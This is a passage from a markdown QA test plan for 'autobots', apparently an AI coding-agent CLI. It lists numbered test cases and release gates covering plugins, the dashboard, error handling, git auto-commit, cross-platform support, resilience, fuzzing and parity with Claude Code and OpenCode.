| AB-388 | Plugin system documentation/examples exist for a third-party developer to actually write one without reading autobots source code | At least one working example plugin in docs/repo | P1 |
| AB-389 | Plugin hooks have access to enough context to be useful (phase ID, cluster, file changes) without being able to access secrets (API key) | Confirm secrets aren't passed into the plugin hook context | P0 |
| AB-390 | Uninstalling/removing a plugin cleanly | No orphaned references causing errors on next run | P2 |

## 33. Skill Marketplace

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-391 | `autobots marketplace` lists available built-in skill packs (FastAPI, Django, React, Next.js per README) | Listing is accurate and matches what's actually installable | P0 |
| AB-392 | Install a skill pack via marketplace command | Pack's content is correctly injected into relevant cluster prompts afterward | P0 |
| AB-393 | Install a skill pack, then verify it shows in `autobots catalog`/relevant listing as active | Discoverable post-install, not invisible | P1 |
| AB-394 | Install a skill pack that conflicts/overlaps with an existing one (e.g. two different React conventions packs) | Clear conflict handling, not silent last-one-wins with no warning | P1 |
| AB-395 | Marketplace works offline (bundled packs) vs requires network (remote packs) — confirm which is which and that this is documented | No confusing failures from assuming network when bundled, or vice versa | P1 |
| AB-396 | Uninstall a skill pack | Cleanly removes its injection from future prompts | P1 |
| AB-397 | A third-party/community skill pack format — is it documented well enough for someone OTHER than the README author to publish one | Real extensibility, not just a hardcoded internal list dressed up as a "marketplace" | P1 |
| AB-398 | Marketplace skill pack content security — is there any vetting/sandboxing for what a downloaded pack can contain (since it gets injected directly into model prompts) | At minimum, documented trust model for third-party packs | P1 |

## 34. Web Dashboard

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-399 | `autobots dashboard` launches a server on port 8080 as documented | Accessible at `localhost:8080`, loads without error | P0 |
| AB-400 | Dashboard shows live status during an active run (open dashboard, then run in another terminal) | Real-time updates, not requiring manual refresh, and not stale | P0 |
| AB-401 | Port 8080 already in use by another process | Clear "port in use" error with a suggestion (e.g. `--port` flag), not a silent failure to start | P0 |
| AB-402 | Dashboard accessible from another device on the same network (if intended) vs localhost-only | Confirm binding behavior matches intent — localhost-only by default is the safer choice and should be the default unless explicitly opened | P0 |
| AB-403 | Dashboard requires no authentication by default — confirm this is acceptable given it may show cost/audit data, or that auth is at least optional | Document the security posture clearly since this is a local web server exposing project data | P1 |
| AB-404 | Dashboard graceful shutdown (Ctrl+C) | Releases the port cleanly, doesn't leave a zombie process | P1 |
| AB-405 | Dashboard with a very large project (many phases/snapshots) | Page loads in reasonable time, doesn't try to render thousands of DOM rows naively | P2 |
| AB-406 | Dashboard works in major browsers (Chrome, Firefox, Safari) without JS console errors | Cross-browser sanity check | P2 |
| AB-407 | Dashboard correctly reflects a FAILED/rolled-back run state, not just successful progress | Same accuracy bar as `autobots status` (cross-ref AB-318) | P1 |
| AB-408 | Dashboard during a `--milestone` run shows the upcoming checkpoint clearly | Useful information density matching what a CLI user would want visually | P2 |

## 35. Response Streaming

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-409 | Long model response (large code generation) shows live character counter as documented | Counter updates in real time, gives the user confidence the process isn't hung | P0 |
| AB-410 | Streaming interrupted by network blip mid-response | Either resumes/retries cleanly or fails with a clear partial-response error, not silently accepting a truncated response as complete | P0 |
| AB-411 | `--verbose` mode combined with streaming | Full prompt + streaming response both shown without garbling each other in terminal output | P1 |
| AB-412 | Streaming output in a non-TTY/piped context (CI logs) | Degrades to non-streaming-looking sequential output without broken control characters | P1 |
| AB-413 | Streaming character counter accuracy vs final token count in `autobots stats` | Roughly consistent, not wildly different units causing confusion | P2 |
| AB-414 | Compare streaming UX directly against Claude Code's live tool-output streaming | Should feel equally responsive — this is a major "is the tool alive" trust signal for users coming from those tools | P1 |

## 36. Structured Error Handling

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-415 | Every documented error in the Troubleshooting table (README) actually produces that exact error text when triggered | Verify all 5 documented troubleshooting scenarios produce matching real output | P0 |
| AB-416 | Errors include actionable next steps (not just "X failed") | Every P0/P1 error message in this entire suite should include a suggested fix, per the "Structured Errors" feature claim | P0 |
| AB-417 | Errors are categorized/typed consistently (e.g. config errors vs network errors vs validation errors look visually distinct) | Consistent formatting convention across error types | P1 |
| AB-418 | An UNHANDLED/unexpected exception (genuinely unforeseen bug) — does it crash with a raw Python traceback or get caught by a top-level handler with a "please report this" message + relevant context | Top-level catch-all exists; no raw traceback dumped on a first-time user | P0 |
| AB-419 | Error messages never contain secrets (cross-ref AB-030) even in unexpected/unhandled exception paths | Redaction applies universally, not just in the "happy path" logging | P0 |
| AB-420 | Errors triggered deep in the call stack (e.g. inside a cluster routing decision) surface with enough context to know WHICH phase/task caused them | No generic "an error occurred" with zero context for debugging | P0 |
| AB-421 | Exit codes are distinct/meaningful per error category for scripting (not everything returns the same generic non-zero code) | Documented exit code scheme | P1 |
| AB-422 | Error output color/formatting renders correctly across terminal types (Windows Terminal, iTerm2, basic xterm) | No broken ANSI codes showing as raw escape sequences | P1 |
| AB-423 | An error mid-multi-step-operation correctly identifies which STEP failed, not just which command was running | Granular enough to actually debug from the message alone | P1 |
| AB-424 | "Bug report" friendliness — if a user hits an unhandled error, is there a clear path to file an issue (GitHub link, template) | Matches the polish bar of mature CLI tools | P2 |

## 37. Git Integration / Auto-commit

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-425 | Phase completes successfully, auto-commit fires | Commit created on the safety branch with a meaningful, phase-specific message | P0 |
| AB-426 | Commit message includes the phase ID/task description for traceability | `git log` is genuinely useful for understanding what autobots did, not generic "autobots commit" messages | P1 |
| AB-427 | Auto-commit disabled via config (if such a flag exists) | Files written but not committed, leaving staging to the user | P1 |
| AB-428 | Auto-commit when there's nothing actually changed (no-op phase) | No empty commit created | P1 |
| AB-429 | Auto-commit interaction with pre-commit hooks already configured in the project (e.g. a linter pre-commit hook that would reject the commit) | Documented behavior — does autobots respect/run pre-commit hooks, and what happens if a hook rejects the commit | P1 |
| AB-430 | Git user.name/user.email not configured globally or locally | Clear error rather than a cryptic git failure, OR a sensible autobots-specific identity fallback | P1 |
| AB-431 | Commit signing (GPG) required by repo policy | Either supported or clear failure message, not silent unsigned commit attempt that just fails | P2 |
| AB-432 | Auto-commit + `autobots undo` interaction — does undo also revert the git commit, or just the working tree | Documented and consistent relationship (cross-ref AB-274) | P0 |
| AB-433 | Run against a repo using git worktrees | No confusion about which worktree is the actual target | P2 |
| AB-434 | Run against a repo with git submodules | Submodule boundaries respected, autobots doesn't try to write across submodule boundaries unexpectedly | P2 |
| AB-435 | Large binary file accidentally committed by a phase — repo size growth check | At minimum surfaced as a warning given typical `.gitignore`/LFS conventions weren't necessarily known to the model | P2 |
| AB-436 | Force-push or history rewrite is NEVER performed automatically by autobots under any mode | Verified absent across all three execution modes — this would be a severe trust violation if it ever happened silently | P0 |

## 38. `autobots gate` Test Gate

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-437 | `autobots gate` runs the configured test suite before allowing a commit | Tests run, commit blocked on failure | P0 |
| AB-438 | `autobots gate` with passing tests | Commit proceeds | P0 |
| AB-439 | `autobots gate` with no tests configured at all (`testing-strategy.md` empty/missing) | Clear "no test command configured" rather than silently passing as if tests ran | P0 |
| AB-440 | `autobots gate` run standalone (not as part of `run`) directly by the user as a manual safety check | Works correctly outside the full run lifecycle | P1 |
| AB-441 | `autobots gate` exit code for CI integration | Correct, scriptable | P1 |
| AB-442 | `autobots gate` test command failure output verbosity | Shows enough of the actual test failure to be useful, not just pass/fail | P1 |
| AB-443 | `autobots gate` performance on a slow test suite (multi-minute) | No artificial timeout cutting off a legitimately slow but passing suite | P1 |
| AB-444 | `autobots gate` consistency with the validation step used inside `run` (cross-ref AB-241) | Identical underlying logic, same results | P1 |

## 39. `autobots validate-models`

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-445 | `autobots validate-models` with valid key and healthy API | Confirms connectivity to all registered models, or a representative sample | P0 |
| AB-446 | `autobots validate-models` with an invalid key | Clear per-model or overall auth failure report | P0 |
| AB-447 | `autobots validate-models` when some models are reachable and others aren't (partial outage) | Reports per-model status individually, not one blanket pass/fail | P1 |
| AB-448 | `autobots validate-models` run time for the full registry (60+ models across clusters) | Reasonable time, ideally parallelized rather than sequential one-by-one | P1 |
| AB-449 | `autobots validate-models --cluster X` (if scoped validation is supported) | Limits check to just that cluster | P2 |
| AB-450 | `autobots validate-models` results match what `autobots doctor` reports for API connectivity | Consistent between the two commands | P1 |

## 40. `autobots publish`

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-451 | `autobots publish` builds the package correctly (this is dogfooding — autobots publishing itself) | Build artifacts match what a manual `python -m build` would produce | P1 |
| AB-452 | `autobots publish` without PyPI credentials configured | Clear credential error before attempting upload, not a failed upload with a confusing API error | P0 |
| AB-453 | `autobots publish` to TestPyPI vs real PyPI (if a test-mode flag exists) | Correctly targets the intended index | P1 |
| AB-454 | `autobots publish` with an uncommitted/dirty working tree | Either blocked or warns clearly before publishing a build that doesn't match git history | P1 |
| AB-455 | `autobots publish` version bump validation (rejects publishing the same version twice) | PyPI would reject this anyway, but a local pre-check saves a wasted round trip | P2 |
| AB-456 | `autobots publish` dry-run mode | Shows what would be published without actually uploading | P1 |

## 41. Cross-Platform: Windows

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-457 | Full install → init → plan → run cycle on Windows 11 + PowerShell | Identical functional behavior to macOS/Linux | P0 |
| AB-458 | Path separator handling (`\` vs `/`) throughout config, context files, and generated code | No path-related crashes or incorrect file references on Windows | P0 |
| AB-459 | `$env:NVIDIA_API_KEY` PowerShell syntax from README actually works as documented | Verified working exactly as written | P0 |
| AB-460 | File locking behavior (Section 19) on Windows, which has different file-lock semantics than POSIX | No Windows-specific lock deadlocks or false negatives | P0 |
| AB-461 | Long path handling (Windows MAX_PATH, cross-ref AB-252) | No silent truncation/failure | P1 |
| AB-462 | Windows Defender / antivirus interaction — does autobots trigger false-positive flags due to its file-writing + command-execution behavior | At minimum, a known-issues note if this is a real friction point | P2 |
| AB-463 | Windows Terminal vs legacy `cmd.exe` vs PowerShell — verify CLI output (colors, progress bars) renders correctly in all three | No broken output in legacy cmd.exe specifically | P1 |
| AB-464 | Git Bash on Windows (common dev setup) | CLI works correctly in this hybrid environment too | P1 |
| AB-465 | Windows-specific line ending generation (CRLF) in newly created files vs the project's existing convention | Respects `conventions.md`/existing file convention rather than always forcing CRLF | P2 |
| AB-466 | WSL2 (Windows Subsystem for Linux) usage | Functions correctly when treated as a Linux environment, with correct path translation if crossing the Windows/WSL boundary | P1 |

## 42. Cross-Platform: macOS/Linux

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-467 | Full install → init → plan → run cycle on macOS (Apple Silicon) | Identical functional behavior to other platforms | P0 |
| AB-468 | Full cycle on Ubuntu LTS | Same | P0 |
| AB-469 | Full cycle on a minimal/Alpine-based Linux container (musl libc, not glibc) | No silent dependency incompatibilities | P1 |
| AB-470 | File permission handling (chmod, executable bits) on generated scripts | Correct permissions set when a phase generates an executable script (e.g. in `scripts/`) | P1 |
| AB-471 | Case-sensitive filesystem (Linux default) vs case-insensitive (macOS default) — file path references from generated code | No accidental case-mismatch bugs that only surface on Linux CI but not local macOS dev | P0 |
| AB-472 | `$HOME` resolution consistency across both platforms | Config loading from `$HOME` works identically | P1 |
| AB-473 | Signal handling (SIGINT/SIGTERM/SIGHUP) consistent between macOS and Linux for graceful shutdown (cross-ref AB-188, AB-192) | Same clean-shutdown guarantees on both | P0 |
| AB-474 | Shell completions (Section 30) actually load correctly in default macOS zsh vs default Ubuntu bash | Both work out of the box per their respective platform defaults | P1 |
| AB-475 | Apple Silicon vs Intel Mac — any native dependency compiled differently | No architecture-specific install failures | P1 |
| AB-476 | Terminal emulator differences (macOS Terminal.app, iTerm2, GNOME Terminal, Linux tmux sessions) | Consistent rendering of progress bars/colors across all | P2 |

## 43. Environment Variable Overrides

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-477 | `AUTOBOTS_MODEL_SELECTION_PROFILE` overrides the TOML config value | Env var wins, confirm precedence is documented | P0 |
| AB-478 | `AUTOBOTS_ENABLE_PARALLEL_PLANNING` toggles parallel planning correctly | Matches `parallel_planning` TOML behavior (Section 10) | P1 |
| AB-479 | `AUTOBOTS_DISABLE_LIVE_CATALOG` | Matches `disable_live_catalog` TOML behavior | P1 |
| AB-480 | `AUTOBOTS_SAFETY_BRANCH` overrides the configured branch name | Confirmed working override | P0 |
| AB-481 | `AUTOBOTS_DEFAULT_MODE` overrides default execution mode when no `--supervised`/`--milestone`/`--autonomous` flag is passed | Correct precedence: CLI flag > env var > TOML > built-in default | P0 |
| AB-482 | `AUTOBOTS_MILESTONE_THRESHOLD` | Overrides correctly | P1 |
| AB-483 | `AUTOBOTS_MAX_VERIFICATION_ATTEMPTS` | Overrides correctly | P1 |
| AB-484 | Invalid value in an env var (e.g. `AUTOBOTS_MILESTONE_THRESHOLD=banana`) | Same quality of error as an invalid TOML value, not a silent fallback to some default with no warning | P0 |
| AB-485 | All env vars unset, all TOML keys unset | Documented built-in defaults apply consistently | P1 |
| AB-486 | Env var set to empty string (`AUTOBOTS_SAFETY_BRANCH=""`) vs genuinely unset | Treated distinctly and sensibly — empty string shouldn't silently mean "no safety branch check" unless that's explicitly documented | P1 |

## 44. Concurrency & Race Conditions

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-487 | Two `autobots run` processes against the SAME project (cross-ref AB-255, deeper stress version) | Lock prevents any interleaved writes whatsoever — verify by inspecting file content for corruption, not just that an error message appeared | P0 |
| AB-488 | `autobots status` and `autobots run` reading/writing `progress-tracker.md` simultaneously | No torn reads producing a corrupted status display | P1 |
| AB-489 | `parallel_planning` enabled with phases writing to overlapping (but not identical) files in the same root | Either serialized automatically for safety or explicitly flagged as a planning-time conflict (cross-ref AB-106) | P0 |
| AB-490 | Dashboard (Section 34) and an active `run` both reading session state at high frequency | No file-lock contention causing either to error out under normal polling frequency | P1 |
| AB-491 | Rapid sequential `autobots undo` calls (scripted, no delay) | Each undo waits for the previous to fully complete, no interleaved partial rollbacks | P0 |
| AB-492 | Snapshot creation interrupted by a concurrent `autobots snapshots` read | No corrupted snapshot listing | P1 |
| AB-493 | Plugin hook (Section 32) that itself spawns a concurrent autobots invocation (recursive/nested call) | Either explicitly blocked or handled safely — recursive self-invocation is a realistic plugin-author mistake to guard against | P1 |
| AB-494 | Git auto-commit racing against a manual `git commit` the user runs in another terminal at the same instant | No corrupted git index/lock state | P1 |

## 45. Large Codebase / Scale Stress

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-495 | `autobots init` against a 100k+ file monorepo | Completes in reasonable time without OOM | P0 |
| AB-496 | `autobots plan` generating a 50+ phase roadmap for a genuinely large feature | Doesn't degrade in quality or silently cap at a smaller number without telling the user | P1 |
| AB-497 | Full autonomous run executing 50+ phases back to back | No degradation/drift in quality, context budget management, or speed across the long run | P1 |
| AB-498 | Snapshot storage after 50+ phases (cross-ref AB-272) | Disk usage stays manageable, retrieval stays fast | P1 |
| AB-499 | `autobots logs`/`autobots explain` performance after hundreds of completed tasks across project history | Stays responsive, no linear-scan slowdowns becoming user-noticeable | P1 |
| AB-500 | Single phase generating a very large file (10k+ lines, e.g. a generated data file) | Handled without truncation or memory blowup | P2 |
| AB-501 | Project with a deeply nested directory structure (10+ levels) | No path-handling issues at depth | P2 |
| AB-502 | Roadmap with phases spanning ALL 9 clusters in a single run | Full routing diversity stress test, no cluster-specific bug only surfacing under variety | P1 |
| AB-503 | Repeated `autobots plan --append` building a roadmap with 100+ total phases over time | `roadmap.md` remains a valid, parseable file at that scale (cross-ref AB-126) | P1 |
| AB-504 | Memory profile of a long autonomous run (1000+ phases would be extreme, but test at 100+) sampled at intervals | No unbounded growth pattern indicating a leak | P1 |

## 46. Network Failure & API Resilience

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-505 | Total network loss right as a model call is initiated | Clear network error, retry per `utils/retry.py` exponential backoff, eventual clear failure if retries exhaust | P0 |
| AB-506 | NVIDIA NIM API returns a 429 (rate limit) | Backoff-and-retry kicks in automatically rather than immediately failing the whole phase | P0 |
| AB-507 | NVIDIA NIM API returns a 500/503 (server error) | Retried per backoff policy, distinct handling from a 4xx client error which should NOT be retried pointlessly | P0 |
| AB-508 | API call hangs with no response (no error, no timeout from the server) | Client-side timeout enforced, doesn't hang the run forever | P0 |
| AB-509 | Network restored mid-backoff-wait | Next retry succeeds without requiring a full restart of the phase | P1 |
| AB-510 | API returns a malformed/unexpected response shape (not matching expected schema) | Caught and reported clearly, not an unhandled parse exception (cross-ref AB-418) | P0 |
| AB-511 | DNS resolution failure for the API endpoint | Specific "can't resolve host" error distinct from a generic connection failure | P1 |
| AB-512 | API key valid but account has hit a billing/quota limit | Distinct, clear error from a generic auth failure (cross-ref AB-028) | P1 |
| AB-513 | Retry/backoff exponential timing — verify actual delays grow correctly (1s, 2s, 4s, etc.) rather than constant-interval retry mislabeled as "exponential" | Measured timing matches the claimed strategy | P1 |
| AB-514 | Maximum retry count is bounded — confirm it eventually gives up rather than retrying forever on a permanently-down endpoint | Bounded retry count with clear final failure | P0 |
| AB-515 | Streaming response (Section 35) cut off mid-stream by a network drop | Confirm partial content isn't silently treated as the complete, final response (cross-ref AB-410) | P0 |
| AB-516 | Live catalog fetch (Section 11) network failure during `autobots plan`/`run`, not just standalone `catalog` command | Falls back to bundled registry consistently everywhere live catalog is used, not just in the dedicated command | P1 |

## 47. Malformed Input / Fuzzing

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-517 | Pass a `--goal` string of 100,000+ characters | Handled gracefully (truncated with warning, or rejected with a size-limit error) — never a crash | P0 |
| AB-518 | Pass binary/non-UTF8 garbage as a CLI argument | No crash, clear "invalid input encoding" error | P1 |
| AB-519 | Pass null bytes embedded in a CLI argument | Sanitized/rejected, doesn't propagate into file paths or shell commands | P0 |
| AB-520 | Roadmap file with deeply nested/malformed markdown that could confuse a naive parser (mismatched headers, broken tables) | Parser fails gracefully with a line-level error, not a silent misparse that executes the wrong phases | P0 |
| AB-521 | Context file containing extremely long single lines (1MB single line, no newlines) | No parser hang/crash | P1 |
| AB-522 | TOML config with deeply nested/recursive table references (if TOML syntax allows pathological nesting) | Parser has reasonable limits, doesn't hang | P2 |
| AB-523 | CLI flags passed in unexpected combinations (e.g. `--supervised --milestone --autonomous` all at once) | Clear "mutually exclusive flags" error, not silently picking one with no explanation | P0 |
| AB-524 | Negative numbers where positive integers are expected (`--threshold -5`) | Rejected with validation error | P1 |
| AB-525 | Extremely long file paths in generated phase definitions (synthetic edge case beyond normal usage) | No buffer/path-length crash | P2 |
| AB-526 | Roadmap phase ID containing special characters that could break file naming or audit-trail lookups (e.g. `P1/T1`, `P1<T1>`) | Sanitized or rejected at generation time | P1 |
| AB-527 | Model API response containing content that LOOKS like a CLI command injection attempt embedded in generated code comments | Confirm this can never be executed as an actual shell command anywhere in the pipeline (cross-ref Section 23) | P0 |
| AB-528 | Simultaneous fuzzing of multiple input surfaces at once (CLI args + config + context files all malformed together) | System fails predictably on the FIRST validation issue encountered, doesn't cascade into undefined behavior from compounding bad state | P1 |

## 48. Upgrade / Version Migration

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-529 | Upgrade from v0.1.8 to v0.1.9 (or current) on a project with existing roadmap/progress/snapshots | All existing state remains valid and readable post-upgrade | P0 |
| AB-530 | Upgrade across a version that changes the config schema (if any have) | Old config either auto-migrates or gives a clear migration error, not a silent misinterpretation of old keys | P0 |
| AB-531 | Downgrade (pip install an older version over a newer one) | Either works or fails with a clear incompatibility message, not silent corruption of newer-format state files | P1 |
| AB-532 | Project with a roadmap created by an old version, opened by a new version's `autobots status` | Backward-compatible reading of older roadmap/progress file formats | P1 |
| AB-533 | CHANGELOG/Version History table accuracy — spot check 2-3 entries against actual git tags/release dates | No drift between documented history and reality | P2 |
| AB-534 | New version introduces a new required context file (hypothetically) — confirm a clear migration message tells existing users what's needed | Forward-looking: this pattern should be in place even if not yet triggered | P2 |

## 49. Uninstall & Cleanup

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-535 | `pip uninstall autobot-swarm` | Cleanly removes the package, CLI binary no longer resolves | P0 |
| AB-536 | Project-local files left behind after uninstall (`context/`, `.autobots.toml`, snapshots, lock files) | Documented whether these are meant to be user-cleaned manually (they should NOT be auto-deleted by an uninstall, since that's destructive to project history) | P1 |
| AB-537 | Reinstall after uninstall on the same project | Picks up existing project state (roadmap, progress) correctly, doesn't think it's a brand-new project | P1 |
| AB-538 | Any global state outside the project (e.g. `$HOME`-level cache/config) — is it cleaned up or does it persist | Documented behavior either way | P2 |
| AB-539 | Uninstall mid-run (pip uninstall while `autobots run` is actively executing in another terminal) | Document this edge case — ideally the running process at least completes its current write safely rather than the binary disappearing mid-operation | P2 |
| AB-540 | Full clean-machine reinstall test — wipe venv, fresh `pip install`, confirm zero residual state affects the fresh install's first-run behavior | True fresh-start confirmation | P1 |

## 50. End-to-End User Journeys (Claude Code / OpenCode Parity)

These are not unit-style checks — each one is a full, uninterrupted session run by someone who is **not you**, with **no hints**, starting from nothing. This is the actual bar Claude Code and OpenCode clear today, and it's the bar that decides whether Autobots is "ready" or just "works when I run it."

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-541 | Hand a fresh laptop with only Python installed to a developer who has never seen Autobots. Give them only the README. Time how long until their first successful phase executes. | Should be comparable to a first `claude` or `opencode` session — minutes, not hours, and with zero messages to you asking "what do I do now" | P0 |
| AB-542 | Same tester, completely unfamiliar codebase (not one of yours) — clone a random mid-size open-source repo, run `autobots init` → `plan` → `run` to add a small real feature | Produces a genuinely working, reviewable change without the tester needing to read autobots source code | P0 |
| AB-543 | Tester asks a "talk to it about the project" style question outside the structured plan/run flow — e.g. "what does this codebase do" or "where's the auth logic" — confirm whether autobots supports ad-hoc Q&A at all, or ONLY structured phase execution | If there's no conversational/query mode at all (unlike Claude Code's chat-first interaction), this is a real, important gap to document loudly, not bury | P0 |
| AB-544 | Tester tries to course-correct mid-run the way they would with Claude Code ("actually, don't touch that file, use X library instead") | Confirm whether there's ANY mechanism for this, or whether the only options are approve/reject/undo with no in-loop steering | P0 |
| AB-545 | Tester wants to just ask a single one-off coding question without going through init/plan/roadmap ceremony (the equivalent of opening Claude Code and typing "fix this bug" with no setup) | Document whether Autobots supports a lightweight single-shot mode, or whether the roadmap ceremony is mandatory for every interaction — and whether that's acceptable for the target audience | P0 |
| AB-546 | Tester's first run produces an unsatisfying result — can they easily say "try again differently" without manually editing roadmap.md by hand | Iteration loop should be as low-friction as re-prompting in a chat tool | P1 |
| AB-547 | Full session against `github-profile-score` (your real, live project) — run a genuine roadmap item end to end | Validates against actual production-complexity code, not a toy example | P0 |
| AB-548 | Full session against `PROTEUS` specifically targeting the known unresolved 502 on the NIM inference pipeline endpoint as the task | This is real dogfooding against a real open bug — does autobots actually help diagnose/fix it, or does it struggle the way a human debugging session would | P1 |
| AB-549 | Full session against `THEMIS` — a task involving the existing LoRA training pipeline code, which is far outside typical CRUD-app territory | Tests whether routing/clusters meaningfully help on ML-pipeline code, not just web-app boilerplate | P1 |
| AB-550 | Tester deliberately gives an ambiguous, underspecified goal (the way real feature requests often arrive) | Plan output is still usable, or the tool asks clarifying questions rather than confidently producing the wrong thing | P1 |
| AB-551 | Tester abandons a run halfway (loses interest, walks away) and comes back 2 days later | `autobots status` then `autobots resume` gets them back into flow with zero memory of where they left off required | P0 |
| AB-552 | Tester compares the "diff review before applying" experience directly against Claude Code's diff view in the same sitting | Should not feel like a downgrade in clarity, even though the rendering surface (CLI vs IDE-integrated) differs | P0 |
| AB-553 | Tester tries to use autobots on a project with an existing CI pipeline (GitHub Actions) — does autobots-generated code pass CI on first push | Real-world validation gate beyond autobots' own internal validation | P1 |
| AB-554 | Tester intentionally tries to break it by giving a goal that's actually a request to do something destructive ("delete all my tests so they stop failing") | Confirm there's at least a sanity check/confirmation here — the system shouldn't autonomously comply with self-evidently bad requests just because they're well-formed | P0 |
| AB-555 | Tester runs the SAME goal through Autobots and through Claude Code on two copies of the same starting repo, blind-compares the resulting diffs | Document the actual quality delta honestly — this is the real comparison that matters for the "ready to announce" decision | P0 |
| AB-556 | Tester checks whether autobots respects an existing `.editorconfig`/Prettier/ESLint config in the target repo the same way Claude Code does | Generated code matches existing project formatting standards automatically | P1 |
| AB-557 | Tester runs a task that genuinely requires multi-file refactoring (rename a function used in 15 places) | Multi-root writing (Section 18) handles this correctly across all affected files in one phase | P0 |
| AB-558 | Tester tries the onboarding wizard (Section 7) as their very first command, with zero prior context, and judges whether the generated context files are good enough to plan from immediately | First-five-minutes experience parity check | P0 |
| AB-559 | Tester explicitly tries `autobots dashboard` as their primary way of monitoring instead of the terminal, the way some OpenCode users prefer a GUI | Dashboard alone is sufficient to safely operate a run (approve/monitor) without needing to also watch the terminal | P1 |
| AB-560 | New tester is asked, unprompted, "would you trust this enough to run it on your actual work project autonomously overnight" | Honest yes/no answer recorded — this is the real bar, not whether individual commands technically function | P0 |
| AB-561 | Tester who has used BOTH Claude Code and OpenCode extensively is asked to rank Autobots against both on: speed of first success, trust in autonomous mode, quality of diff review, and recoverability from failure | Document the honest ranking — don't announce "ready" if it loses badly on more than one axis | P0 |
| AB-562 | Repeat AB-541 through AB-561 with a SECOND, different tester to rule out the first tester just happening to get lucky or unlucky | Consistent results across two independent testers before trusting the conclusion | P0 |

## 51. Comparative Parity Checklist vs Claude Code / OpenCode

Go through this list and mark each item Yes/No/Partial, honestly. This is the gap analysis — it is more important than the pass/fail counts above.

| ID | Capability (present in Claude Code and/or OpenCode) | Does Autobots have an equivalent? | Priority |
|----|------------------------------------------------------|-----------------------------------|----------|
| AB-563 | Free-form conversational interaction with the codebase, not just structured roadmap execution | Assess and record Yes/Partial/No | P0 |
| AB-564 | Mid-task steering ("actually do X instead") without aborting the whole task | Assess and record | P0 |
| AB-565 | Low-friction single-shot mode for small asks (no mandatory init/plan ceremony) | Assess and record | P0 |
| AB-566 | Clear, fast diff review before any file is touched | Assess and record — Autobots has this per README, confirm it's actually fast and clear in practice | P0 |
| AB-567 | Reliable crash/interruption recovery (session resume) | Assess and record — Autobots claims this, verify against Section 21 results | P0 |
| AB-568 | Permission/approval model with sensible granularity (not all-or-nothing) | Assess and record — Autobots has 3 modes, compare granularity to Claude Code's per-tool permissions | P1 |
| AB-569 | Sandboxed/whitelisted command execution to prevent destructive actions | Assess and record — cross-ref Section 23 results | P0 |
| AB-570 | Cost/usage transparency during and after a session | Assess and record — cross-ref Section 26 | P1 |
| AB-571 | Easy install with minimal prerequisites | Assess and record — cross-ref Section 2 | P1 |
| AB-572 | Respects existing project conventions/formatting automatically | Assess and record — cross-ref AB-556 | P1 |
| AB-573 | Handles large/real-world codebases without choking | Assess and record — cross-ref Section 45 | P1 |
| AB-574 | Helpful, actionable error messages (not raw stack traces) | Assess and record — cross-ref Section 36 | P0 |
| AB-575 | Extensibility (plugins/skills) that a third party can actually use without reading source | Assess and record — cross-ref Sections 32–33 | P1 |
| AB-576 | Works identically across Windows/macOS/Linux | Assess and record — cross-ref Sections 41–42 | P1 |
| AB-577 | Visual/dashboard option for users who don't want pure terminal | Assess and record — cross-ref Section 34 | P2 |
| AB-578 | Fast time-to-first-result for a brand-new user | Assess and record — cross-ref AB-541 | P0 |
| AB-579 | Trustworthy enough for unattended/autonomous overnight runs | Assess and record — cross-ref AB-560 | P0 |
| AB-580 | A genuinely differentiated reason to choose Autobots OVER Claude Code/OpenCode for at least one real use case (e.g. NVIDIA NIM model diversity, the 9-cluster specialization model) | Identify and articulate this explicitly — "as good as" isn't a launch story, "better at X" is | P1 |

## 52. Release Readiness Sign-off

| ID | Gate | Requirement | Status |
|----|------|-------------|--------|
| AB-581 | All P0 tests in Sections 1–49 pass | 100% required, zero exceptions | ⬜ |
| AB-582 | ≥95% of P1 tests in Sections 1–49 pass | Remaining failures documented as known issues with workarounds | ⬜ |
| AB-583 | Zero data-loss scenarios found anywhere (rollback, undo, resume, crash recovery) | This is the single hardest blocker — any data-loss bug found anywhere in this suite halts release regardless of everything else passing | ⬜ |
| AB-584 | Zero security bypass scenarios found in Section 23 (command whitelist) | Same severity as data loss — any bypass halts release | ⬜ |
| AB-585 | Zero secret-leakage scenarios found (Sections 3, 27, 36) | API keys/credentials never appear in logs, errors, or audit trails under any tested condition | ⬜ |
| AB-586 | Section 50 (End-to-End Journeys) completed by at least 2 independent first-time testers | Both testers reach a working result without your direct help | ⬜ |
| AB-587 | Section 51 (Parity Checklist) completed honestly, gaps documented | No "Yes" marked without it actually being verified in this suite | ⬜ |
| AB-588 | At least one item in AB-580 (differentiator) is genuinely true and demonstrable | Have a real answer ready for "why not just use Claude Code" | ⬜ |
| AB-589 | README accuracy pass — every command, flag, and config key in the README was actually exercised somewhere in this suite | No documented-but-untested surface area | ⬜ |
| AB-590 | Known issues list compiled from every ❌/⚠️ result above | Published alongside the release, not hidden | ⬜ |
| AB-591 | Cross-platform results (Sections 41–42) confirmed on real hardware for each OS, not assumed/extrapolated | Actual Windows + macOS + Linux runs, not "should work" | ⬜ |
| AB-592 | Cost/billing accuracy (Section 26) verified against a real NVIDIA NIM invoice for at least one full session | Real money, real reconciliation, not just internal math | ⬜ |
| AB-593 | A tester who answered "No" to AB-560 (would not trust it overnight) has their specific blocking concern resolved and re-tested | Trust is the actual product here — don't ship past an honest "no" | ⬜ |
